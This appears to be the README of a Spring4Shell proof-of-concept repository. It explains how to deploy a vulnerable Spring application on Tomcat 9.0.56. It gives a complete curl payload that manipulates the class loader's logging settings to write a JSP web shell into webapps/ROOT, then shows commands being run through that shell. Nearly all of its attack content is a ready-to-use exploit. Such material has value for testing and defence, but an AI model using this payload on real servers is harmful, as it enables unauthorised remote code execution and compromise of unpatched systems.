# spring4shell-poc
1) checkout the code in local using below link:

2) Download Apache Tomcat and setup in local. I have used 9.0.56 version. We can use any version below 9.0.60 to exploit.

3) Build the application in local and copy the war file to Tomcat webapps folder.

4) Now navivate tomcat bin folder and start the application using startup.sh or startup.bat

5) Now send the payload to application using below curl command

curl -v -d "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%3C%25%20java.io.InputStream%20in%20%3D%20java.lang.Runtime.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20%7B%20out.println(new%20String(in.readAllBytes()))%3B%20%7D%20%25%3E&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=" http://localhost:8080/spring4shell-poc-0.0.1-SNAPSHOT/spring4shell/message

Here:- spring4shell-poc-0.0.1-SNAPSHOT is context root of application

this payload uploads shell.jsp file to webapps/ROOT directory

6) Now we can run remote code using below command

curl http://localhost:8080/shell.jsp?cmd=whoami    (any linux command)
